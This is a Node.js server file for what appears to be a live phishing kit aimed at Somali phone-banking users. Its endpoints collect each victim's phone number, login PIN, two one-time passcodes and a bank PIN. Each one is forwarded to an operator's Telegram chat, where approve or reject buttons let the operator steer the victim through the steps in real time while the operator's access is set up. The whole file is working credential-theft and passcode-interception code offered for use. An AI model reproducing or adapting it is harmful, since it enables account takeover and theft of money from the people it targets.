const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');

if (process.env.NODE_ENV !== 'production') {
    require('dotenv').config();
}

const app = express();
const PORT = process.env.PORT || 8080;
const DOMAIN = process.env.RAILWAY_PUBLIC_URL || process.env.DOMAIN || ""; 

// -------------------- CRITICAL BODY PARSERS FIRST --------------------
// These must be explicitly defined at the top so incoming webhooks and API bodies can be parsed safely
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- INIT BOT --------------------
if (!process.env.BOT_TOKEN) {
    console.error("❌ CRITICAL ERROR: BOT_TOKEN is missing from environment variables.");
    process.exit(1);
}

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

// -------------------- TELEGRAM WEBHOOK MIDDLEWARE --------------------
const WEBHOOK_PATH = `/webhook/${process.env.BOT_TOKEN}`;
if (DOMAIN) {
    app.use(bot.webhookCallback(WEBHOOK_PATH));
}

// -------------------- MEMORY STORE --------------------
const statusStore = {};

// -------------------- ROUTES --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};
    const country = "Somalia";
    const countryCode = "+252";

    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !pin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending";

    const message = `📱 <b>CL 2 - LOGIN ATTEMPT</b>

🆕 <b>NEW USER</b>
🇸🇴 <b>Country:</b> ${country}
🌍 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> ${phone}
🔢 <b>PIN:</b> ${pin}
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>User waiting for approval</b>
⌛ <b>Timeout: 5 minutes</b>`;

    try {
        console.log(`Sending Login Notification to Admin: ${ADMIN_ID}`);
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Allow to proceed", callback_data: `approve|${phone}|${pin}` },
                        { text: "❌ Invalid credentials", callback_data: `deny|${phone}|${pin}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error("Telegram SendMessage Blocked/Failed:", err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- FIRST OTP API --------------------
app.post('/api/verify-first-otp', async (req, res) => {
    const { phone, otp } = req.body || {};
    const country = "Somalia";
    const countryCode = "+252";
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    const otpMessage = `1️⃣ <b>CL 2 - FIRST OTP (Step 1/2)</b>

🆕 <b>NEW USER - FIRST VERIFICATION</b>
🇸🇴 <b>Country:</b> ${country}
🌍 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> ${phone}
🔐 <b>First OTP Code:</b> ${otp}
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Verify FIRST OTP:</b>
⌛ <b>Timeout: 5 minutes</b>
📝 <b>Next: Second OTP will be sent after approval</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correct", callback_data: `otp1_correct|${phone}|${otp}` },
                        { text: "❌ Wrong Code", callback_data: `otp1_wrong|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- SECOND OTP API --------------------
app.post('/api/verify-second-otp', async (req, res) => {
    const { phone, otp } = req.body || {};
    const country = "Somalia";
    const countryCode = "+252";
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    const otpMessage2 = `2️⃣ <b>CL 2 - SECOND OTP (Step 2/2)</b>

🆕 <b>NEW USER - SECOND VERIFICATION</b>
🇸🇴 <b>Country:</b> ${country}
🌍 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> ${phone}
🔐 <b>Second OTP Code:</b> ${otp}
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Verify SECOND OTP:</b>
⌛ <b>Timeout: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage2, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correct", callback_data: `otp2_correct|${phone}|${otp}` },
                        { text: "❌ Wrong Code", callback_data: `otp2_wrong|${phone}` },
                        { text: "🔑 Wrong PIN", callback_data: `otp2_wrongpin|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- RESEND OTP API --------------------
app.post('/api/resend-otp-notification', async (req, res) => {
    const { phone, step } = req.body || {};
    if (!phone || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    const resendMsg = `🔄 <b>RESEND REQUESTED</b>

📱 <b>Phone Number:</b> ${phone}
📍 <b>Step:</b> ${step}
⚠️ <b>User is waiting for a new code.</b>

━━━━━━━━━━━━━━━`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, resendMsg, { parse_mode: 'HTML' });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- BANK PIN API --------------------
app.post('/api/verify-bank-pin', async (req, res) => {
    const { phone, bankPin } = req.body || {};
    const country = "Somalia";
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !bankPin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_bank_pin";

    const bankPinMessage = `🏦 <b>CL 2 - BANK PIN VERIFICATION (Step 3)</b>

🆕 <b>NEW USER - BANK SECURITY</b>
🇸🇴 <b>Country:</b> ${country}
📱 <b>Phone Number:</b> ${phone}
🔑 <b>Bank PIN:</b> ${bankPin}
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Verify BANK PIN:</b>
⌛ <b>Timeout: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, bankPinMessage, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correct", callback_data: `bank_correct|${phone}|${bankPin}` },
                        { text: "❌ Wrong PIN", callback_data: `bank_wrong|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- BOT ACTIONS --------------------

bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "approved";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
    const approvedMsg = `✅ <b>LOGIN APPROVED</b>\n\n🆕 <b>NEW USER</b>\n🇸🇴 <b>Somalia</b>\n📱 <b>${phone}</b>\n🔐 <b>${pin}</b>\n\n━━━━━━━━━━━━━━━\n\n✅ <b>Status: Approved</b>\n➡️ <b>Next: First OTP (1/2)</b>\n⏱️ <b>${currentTime}</b>`;
    try {
        await ctx.answerCbQuery("Allowed");
        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
        await ctx.replyWithHTML(approvedMsg);
    } catch (e) { console.error("Error executing approve action:", e.message); }
});

bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "denied";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
    const deniedMsg = `❌ <b>INVALID CREDENTIALS</b>\n\n🇸🇴 <b>Somalia</b>\n📱 <b>${phone}</b>\n🔐 <b>${pin}</b>\n\n━━━━━━━━━━━━━━━\n\n❌ <b>Status: Rejected</b>\n⏱️ <b>${currentTime}</b>`;
    try {
        await ctx.answerCbQuery("Rejected");
        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
        await ctx.replyWithHTML(deniedMsg);
    } catch (e) { console.error("Error executing deny action:", e.message); }
});

bot.action(/^otp1_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const otp = ctx.match[2];
    statusStore[phone] = "otp1_correct";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
    const verifiedMsg = `1️⃣ <b>FIRST OTP VERIFIED (Step 1/2)</b>\n\n🇸🇴 <b>Somalia</b>\n📱 <b>${phone}</b>\n🔐 <b>${otp}</b>\n\n━━━━━━━━━━━━━━━\n\n✅ <b>Status: First OTP verified</b>\n➡️ <b>Next: Second OTP (2/2) will be sent</b>\n⌛ <b>${currentTime}</b>`;
    try {
        await ctx.answerCbQuery("Verified");
        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
        await ctx.replyWithHTML(verifiedMsg);
    } catch (e) { console.error(e.message); }
});

bot.action(/^otp1_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp1_wrong";
    try {
        await ctx.answerCbQuery("Wrong Code");
        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
        await ctx.replyWithHTML(`❌ <b>FIRST OTP WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter OTP.</b>`);
    } catch (e) { console.error(e.message); }
});

bot.action(/^otp2_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const otp = ctx.match[2];
    statusStore[phone] = "otp2_correct";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
    const verifiedMsg2 = `2️⃣ <b>SECOND OTP VERIFIED (Step 2/2)</b>\n\n🇸🇴 <b>Somalia</b>\n📱 <b>${phone}</b>\n🔐 <b>${otp}</b>\n\n━━━━━━━━━━━━━━━\n\n✅ <b>Status: Second OTP verified</b>\n✅ <b>Process Complete</b>\n⌛ <b>${currentTime}</b>`;
    try {
        await ctx.answerCbQuery("Finalized");
        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
        await ctx.replyWithHTML(verifiedMsg2);
    } catch (e) { console.error(e.message); }
});

bot.action(/^otp2_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp2_wrong";
    try {
        await ctx.answerCbQuery("Wrong Code");
        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
        await ctx.replyWithHTML(`❌ <b>SECOND OTP WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter OTP.</b>`);
    } catch (e) { console.error(e.message); }
});

bot.action(/^bank_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "bank_pin_correct";
    const finalizedMsg = `✅ <b>BANK PIN VERIFIED</b>\n\n🇸🇴 <b>Somalia</b>\n📱 <b>${phone}</b>\n🔑 <b>${pin}</b>\n\n━━━━━━━━━━━━━━━\n\n✅ <b>Status: Process Completed</b>\n🏁 <b>User redirected to Success page</b>`;
    try {
        await ctx.answerCbQuery("Bank PIN Verified");
        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
        await ctx.replyWithHTML(finalizedMsg);
    } catch (e) { console.error(e.message); }
});

bot.action(/^bank_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "bank_pin_wrong";
    try {
        await ctx.answerCbQuery("Wrong Bank PIN");
        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
        await ctx.replyWithHTML(`❌ <b>BANK PIN WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter Bank PIN.</b>`);
    } catch (e) { console.error(e.message); }
});

bot.action(/^otp2_wrongpin\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp2_wrongpin";
    try {
        await ctx.answerCbQuery("Wrong PIN");
        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
        await ctx.replyWithHTML(`🔑 <b>WRONG PIN REPORTED</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>User prompted to re-enter PIN.</b>`);
    } catch (e) { console.error(e.message); }
});

// -------------------- STATUS CHECK --------------------
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    res.json({ status: statusStore[phone] || "pending" });
});

// -------------------- SAFE PAGE ROUTE --------------------
app.get('/:page', (req, res, next) => {
    if (req.params.page.startsWith('api') || req.params.page.startsWith('webhook')) return next();
    const file = req.params.page.endsWith('.html') ? req.params.page : req.params.page + '.html';
    res.sendFile(path.join(__dirname, 'public', file), (err) => {
        if (err) res.status(404).send("Page not found");
    });
});

// -------------------- START SERVER & WEBHOOK --------------------
app.listen(PORT, async () => {
    console.log(`🚀 Server running on port ${PORT}`);
    
    if (DOMAIN) {
        try {
            const formattedDomain = DOMAIN.startsWith('http') ? DOMAIN : `https://${DOMAIN}`;
            const fullWebhookUrl = `${formattedDomain}${WEBHOOK_PATH}`;
            
            await bot.telegram.setWebhook(fullWebhookUrl, { drop_pending_updates: true });
            console.log(`🤖 Webhook synced completely at: ${fullWebhookUrl}`);
        } catch (err) {
            console.error("Webhook synchronization failed:", err.message);
        }
    } else {
        console.error("❌ CRITICAL: RAILWAY_PUBLIC_URL is missing.");
    }
});
                             
